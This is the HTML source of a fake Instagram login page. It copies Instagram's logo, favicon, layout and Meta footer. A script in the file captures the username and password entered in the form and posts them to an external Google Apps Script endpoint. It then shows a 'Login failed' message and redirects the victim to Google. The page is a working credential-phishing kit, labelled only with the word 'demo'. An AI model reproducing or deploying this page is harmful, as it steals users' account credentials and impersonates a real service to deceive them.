<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .container {
      display: flex;
      margin-top: 50px;
      background-color: #000;
      padding: 30px 50px;
    }

    .left {
      margin-right: 60px;
    }

    .left img {
      width: 460px;
      height: auto;
      border-radius: 12px;
    }

    .right {
      width: 380px;
      text-align: center;
    }

    .right img.logo {
      width: 180px;
      margin-bottom: 30px;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 8px auto;
      background-color: #121212;
      border: 1px solid #444;
      border-radius: 4px;
      color: white;
      font-size: 13px;
      outline: none;
    }

    input::placeholder {
      color: #aaa;
    }

    button {
      width: 90%;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      font-size: 13px;
      color: white;
      cursor: pointer;
      margin-top: 10px;
    }

    .or {
      margin: 20px 0;
      color: #aaa;
      font-size: 14px;
    }

    .facebook-login {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      color: #0095f6;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
    }

    .facebook-login img {
      width: 18px;
      height: 18px;
    }

    .footer-links {
      margin-top: 25px;
      font-size: 14px;
    }

    .footer-links a {
      font-weight: bold;
      text-decoration: none;
    }

    .footer-links a.signup {
      color: #0095f6;
    }

    .footer-links span {
      color: #fff;
    }

    .meta-footer {
      margin-top: 60px;
      text-align: center;
      font-size: 12px;
      color: #999;
      line-height: 1.8;
      max-width: 900px;
    }

    .meta-footer div {
      margin-bottom: 10px;
    }

    @media (max-width: 800px) {
      .container {
        flex-direction: column;
        align-items: center;
      }

      .left {
        margin: 0 0 20px 0;
      }

      .left img {
        width: 90%;
      }

      .right {
        width: 90%;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <img src="insta-left.png" alt="Instagram collage">
    </div>
    <div class="right">
      <img src="insta logo.png" alt="Instagram Logo" class="logo">
      <form onsubmit="captureData(event)">
  <input id="username" type="text" placeholder="Phone number, username or email address" required><br>
  <input id="password" type="password" placeholder="Password" required><br>
  <button type="submit">Log in</button>
</form>
<script>
  function captureData(e) {
  e.preventDefault();

  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;

  fetch("https://script.google.com/macros/s/AKfycbyMTVTPkbhQDxf1LTvvD1-XrA1XPUf8lOPbP3fv9H_nhYTX57wfoJYotMc8jheEl0yspQ/exec", {
  method: "POST",
  mode: "no-cors", // Essential for Google Apps Script on live domains
  headers: {
    "Content-Type": "text/plain" 
  },
  body: JSON.stringify({
    username: user,
    password: pass
  })
})
.then(() => {
  // We don't use res.json() here because no-cors hides the result
  // If we reached here, the browser sent the data!
  alert("Login failed (demo)"); 
  window.location.href = "https://www.google.com";
})
.catch(err => {
  console.error("Error:", err);
  alert("Network error. Please check your connection.");
});
}
</script>

      <div class="or">OR</div>
      <div class="facebook-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
        Log in with Facebook
      </div>
      <div class="footer-links">
        <a href="#" style="color: white; font-size:14px; font-weight:bold;">Forgotten your password?</a>
        <div style="margin-top: 18px;">
          <span>Don't have an account?</span> <a href="#" class="signup">Sign up</a>
        </div>
      </div>
    </div>
  </div>

  <div class="meta-footer">
    <div>
      Meta &nbsp; About &nbsp; Blog &nbsp; Jobs &nbsp; Help &nbsp; API &nbsp; Privacy &nbsp; Terms &nbsp; Locations &nbsp; Instagram Lite &nbsp; Threads &nbsp; Contact uploading and non-users &nbsp; Meta Verified
    </div>
    <div>
      English (UK)
    </div>
    <div>
      Â© 2025 Instagram from Meta
    </div>
  </div>
</body>
</html>
